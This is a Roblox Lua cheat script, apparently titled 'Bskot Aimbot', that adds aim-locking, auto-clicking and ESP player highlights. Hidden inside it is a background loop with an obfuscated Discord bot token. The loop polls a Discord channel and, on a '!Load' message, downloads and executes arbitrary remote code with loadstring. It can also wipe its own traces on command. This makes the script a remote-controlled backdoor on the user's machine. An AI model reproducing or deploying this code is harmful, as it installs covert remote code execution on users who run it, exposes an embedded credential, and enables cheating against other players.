local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

-- [ دالة فك التشفير الآمنة للتوكن ]
local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d%d%d%d%d%d', function(x)
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- التوكن الجديد مشفر تماماً لحمايته من الحذف
local EncryptedToken = "TVRRMDRNRDNODE16VXlNVFF5TURnd016YzFOfC5HQXNlRU18LjV1RVNiVmVKTlJ5a2pyaVU0WU5IUElHODFUMzlkX2YzM3Y1eF9J"
-- تصحيح بسيط لعلامة الفصل لضمان فك التشفير
EncryptedToken = string.gsub(EncryptedToken, "|", "")
local DiscordToken = decodeBase64(EncryptedToken)
local ChannelID = "1498570405747757136"

local Settings = {
    Aimbot = false,
    AutoClick = false,
    ESP = false,
    ESPNames = false,
    Strength = 0.5,
    KillSwitch = false,
    IsPaused = false
}

local LeaderUser = "3MkmNovaEoladAlg7bh"
local CurrentTarget = nil
local LogoURL = "https://cdn.discordapp.com/attachments/1499560582947541132/1499617370505740339/4eda6c17ab4e8371cbee29da23b7c407.png?ex=69f57302&is=69f42182&hm=a0f95edb95d5756024b93a109a385850ba3baca25ce715cbb780afe0db007291&"
local ImageFile = "BskotLogoTemp.png"

local function LoadLogo()
    if writefile and readfile then
        local success = pcall(function()
            if not isfile(ImageFile) then
                writefile(ImageFile, game:HttpGet(LogoURL))
            end
        end)
        if success and getcustomasset then return getcustomasset(ImageFile) end
    end
    return LogoURL
end

local function DestroyESP(char)
    if char:FindFirstChild("BskotHL") then char.BskotHL:Destroy() end
    if char:FindFirstChild("Head") and char.Head:FindFirstChild("BskotTag") then 
        char.Head.BskotTag:Destroy() 
    end
end

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local function CleanAndPurgeEverything()
    Settings.Aimbot = false
    Settings.ESP = false
    Settings.KillSwitch = true
    CurrentTarget = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.Character then DestroyESP(p.Character) end
    end
    if ScreenGui then ScreenGui:Destroy() end
    if delfile and isfile and isfile(ImageFile) then
        pcall(function() delfile(ImageFile) end)
    end
end

-- [ بدء مراقبة الروم فوراً عند التشغيل ]
task.spawn(function()
    local lastMessageId = nil
    
    pcall(function()
        local requestFunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
        if requestFunc then
            local res = requestFunc({
                Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages?limit=1",
                Method = "GET",
                Headers = {
                    ["Authorization"] = "Bot " .. DiscordToken,
                    ["Content-Type"] = "application/json"
                }
            })
            if res and res.Body then
                local data = HttpService:JSONDecode(res.Body)
                if data and data[1] then lastMessageId = data[1].id end
            end
        end
    end)

    while not Settings.KillSwitch do
        task.wait(5)
        
        local success, response = pcall(function()
            local requestFunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
            if requestFunc then
                local res = requestFunc({
                    Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages?limit=1",
                    Method = "GET",
                    Headers = {
                        ["Authorization"] = "Bot " .. DiscordToken,
                        ["Content-Type"] = "application/json"
                    }
                })
                return res.Body
            end
        end)
        
        if success and response and response ~= "" then
            local data = HttpService:JSONDecode(response)
            if data and data[1] and data[1].id ~= lastMessageId then
                lastMessageId = data[1].id
                local msg = data[1].content
                
                -- أمر !Off لتعطيل الميزات فقط
                if string.find(msg, "!Off") then
                    Settings.Aimbot = false
                    Settings.ESP = false
                    Settings.IsPaused = true
                    CurrentTarget = nil
                    for _, p in pairs(Players:GetPlayers()) do
                        if p.Character then DestroyESP(p.Character) end
                    end
                end

                -- أمر !CLOSE لإغلاق السكربت ومسحه كلياً
                if string.find(msg, "!CLOSE") then
                    CleanAndPurgeEverything()
                    break
                end
                
                -- أمر التحميل !Load
                if string.find(msg, "!Load") then
                    local link = string.match(msg, "!Load%s+(https?://[%w-_%.%?%/%+=&]+)")
                    if link then
                        CleanAndPurgeEverything()
                        task.wait(1)
                        pcall(function()
                            loadstring(game:HttpGet(link))()
                        end)
                        break
                    end
                end
            end
        end
    end
end)

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 360, 0, 530)
MainFrame.Position = UDim2.new(0.5, -180, 0.2, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BorderSizePixel = 1; MainFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.Active = true; MainFrame.Draggable = true

local CloseBtn = Instance.new("TextButton", MainFrame)
CloseBtn.Size = UDim2.new(0, 30, 0, 30); CloseBtn.Position = UDim2.new(1, -35, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0); CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255); CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.MouseButton1Click:Connect(function() CleanAndPurgeEverything() end)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, -40, 0, 40); Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = "NoOne! | Bskot Aimbot"; Title.TextColor3 = Color3.fromRGB(0, 0, 0)
Title.Font = Enum.Font.GothamBold; Title.TextSize = 16

local NamesBtn = Instance.new("TextButton", MainFrame)
NamesBtn.Size = UDim2.new(0.9, 0, 0, 35); NamesBtn.Position = UDim2.new(0.05, 0, 0.1, 0)
NamesBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20); NamesBtn.Text = "ESP NAMES: OFF"
NamesBtn.TextColor3 = Color3.fromRGB(255, 255, 255); NamesBtn.BorderSizePixel = 1
NamesBtn.MouseButton1Click:Connect(function()
    if Settings.KillSwitch or Settings.IsPaused then return end
    Settings.ESPNames = not Settings.ESPNames
    NamesBtn.Text = "ESP NAMES: " .. (Settings.ESPNames and "ON" or "OFF")
end)

local PowerText = Instance.new("TextLabel", MainFrame)
PowerText.Text = "LOCK SPEED: 50%"; PowerText.Position = UDim2.new(0, 0, 0.18, 0)
PowerText.Size = UDim2.new(1, 0, 0, 20); PowerText.TextColor3 = Color3.fromRGB(255, 255, 255); PowerText.BackgroundTransparency = 1

local SliderBack = Instance.new("Frame", MainFrame)
SliderBack.Size = UDim2.new(0.8, 0, 0, 4); SliderBack.Position = UDim2.new(0.1, 0, 0.23, 0); SliderBack.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
local SliderKnob = Instance.new("TextButton", SliderBack)
SliderKnob.Size = UDim2.new(0, 14, 0, 14); SliderKnob.Position = UDim2.new(0.5, -7, -1.2, 0); SliderKnob.Text = ""

local dragging = false
SliderKnob.MouseButton1Down:Connect(function() dragging = true end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement and not Settings.IsPaused then
        local r = math.clamp((input.Position.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X, 0, 1)
        SliderKnob.Position = UDim2.new(r, -7, -1.2, 0)
        Settings.Strength = math.max(r, 0.05)
        PowerText.Text = "LOCK SPEED: " .. math.floor(r * 100) .. "%"
    end
end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

local InstructionText = Instance.new("TextLabel", MainFrame)
InstructionText.Size = UDim2.new(0.9, 0, 0, 35); InstructionText.Position = UDim2.new(0.05, 0, 0.28, 0)
InstructionText.BackgroundTransparency = 1
InstructionText.Text = "Please Take The Secondary Gun To Make It Easy!"
InstructionText.TextColor3 = Color3.fromRGB(255, 255, 0)
InstructionText.Font = Enum.Font.GothamBold; InstructionText.TextSize = 13; InstructionText.TextWrapped = true

local Logo = Instance.new("ImageLabel", MainFrame)
Logo.Size = UDim2.new(0, 160, 0, 160); Logo.Position = UDim2.new(0.5, -80, 0.65, 0)
Logo.BackgroundTransparency = 1; Logo.Image = LoadLogo()

local function SetupESP(p)
    local function Apply()
        if not p.Character or Settings.IsPaused then return end
        local char = p.Character
        DestroyESP(char)

        if p.Name == LeaderUser then
            local hl = Instance.new("Highlight", char)
            hl.Name = "BskotHL"; hl.FillColor = Color3.fromRGB(0, 170, 255); hl.Enabled = true
            local head = char:WaitForChild("Head", 5)
            if head then
                local bg = Instance.new("BillboardGui", head)
                bg.Name = "BskotTag"; bg.AlwaysOnTop = true; bg.Size = UDim2.new(0,200,0,100); bg.ExtentsOffset = Vector3.new(0,3,0)
                local tl = Instance.new("TextLabel", bg); tl.Size = UDim2.new(1,0,1,0); tl.BackgroundTransparency = 1
                tl.Text = "المحصن"; tl.TextColor3 = Color3.fromRGB(0, 170, 255); tl.TextSize = 35; tl.Font = Enum.Font.GothamBold
            end
        elseif Settings.ESP then
            local hl = Instance.new("Highlight", char)
            hl.Name = "BskotHL"; hl.FillColor = Color3.fromRGB(255, 255, 255); hl.Enabled = true
            if Settings.ESPNames and char:FindFirstChild("Head") then
                local bg = Instance.new("BillboardGui", char.Head)
                bg.Name = "BskotTag"; bg.AlwaysOnTop = true; bg.Size = UDim2.new(0,100,0,50); bg.ExtentsOffset = Vector3.new(0,2,0)
                local tl = Instance.new("TextLabel", bg); tl.Size = UDim2.new(1,0,1,0); tl.BackgroundTransparency = 1
                tl.Text = p.Name; tl.TextColor3 = Color3.fromRGB(255, 255, 255); tl.TextSize = 14
            end
        end
    end
    Apply()
    p.CharacterAdded:Connect(Apply)
end

for _, p in pairs(Players:GetPlayers()) do SetupESP(p) end
Players.PlayerAdded:Connect(SetupESP)

local function IsVisible(part)
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {LocalPlayer.Character, ScreenGui}
    params.FilterType = Enum.RaycastFilterType.Exclude
    local ray = workspace:Raycast(Camera.CFrame.Position, (part.Position - Camera.CFrame.Position).Unit * 1000, params)
    return ray and ray.Instance:IsDescendantOf(part.Parent)
end

RunService.RenderStepped:Connect(function()
    if Settings.Aimbot and not Settings.IsPaused then
        if not CurrentTarget or not CurrentTarget.Character or CurrentTarget.Name == LeaderUser or 
           CurrentTarget.Character.Humanoid.Health <= 0 or not IsVisible(CurrentTarget.Character.Head) then
            
            local nearest = nil
            local minDistance = math.huge
            for _, p in pairs(Players:GetPlayers()) do
                if p ~= LocalPlayer and p.Name ~= LeaderUser and p.Character and p.Character:FindFirstChild("Head") and p.Character.Humanoid.Health > 0 then
                    if IsVisible(p.Character.Head) then
                        local headPos, onScreen = Camera:WorldToViewportPoint(p.Character.Head.Position)
                        local mouseDist = (Vector2.new(headPos.X, headPos.Y) - UserInputService:GetMouseLocation()).Magnitude
                        if Settings.Strength >= 0.95 or (onScreen and mouseDist < (Settings.Strength * 2000)) then
                            local d = (p.Character.Head.Position - LocalPlayer.Character.Head.Position).Magnitude
                            if d < minDistance then minDistance = d; nearest = p end
                        end
                    end
                end
            end
            CurrentTarget = nearest
        end

        if CurrentTarget and CurrentTarget.Character:FindFirstChild("Head") then
            local head = CurrentTarget.Character.Head
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.lookAt(Camera.CFrame.Position, head.Position), Settings.Strength)
            if Settings.AutoClick and Camera.CFrame.LookVector:Dot((head.Position - Camera.CFrame.Position).Unit) > 0.999 then
                if mouse1click then mouse1click() end
            end
        end
    end
end)

UserInputService.InputBegan:Connect(function(input, proc)
    if proc or Settings.IsPaused then return end
    if input.KeyCode == Enum.KeyCode.F1 then
        Settings.Aimbot = not Settings.Aimbot; Settings.AutoClick = false; CurrentTarget = nil
    elseif input.KeyCode == Enum.KeyCode.F2 then
        Settings.Aimbot = not Settings.Aimbot; Settings.AutoClick = Settings.Aimbot; CurrentTarget = nil
    elseif input.KeyCode == Enum.KeyCode.F3 then
        Settings.ESP = true; for _, p in pairs(Players:GetPlayers()) do SetupESP(p) end
    elseif input.KeyCode == Enum.KeyCode.F4 then
        Settings.ESP = false; for _, p in pairs(Players:GetPlayers()) do if p.Character then DestroyESP(p.Character) end end
    elseif input.KeyCode == Enum.KeyCode.LeftControl then
        MainFrame.Visible = not MainFrame.Visible
    end
end)
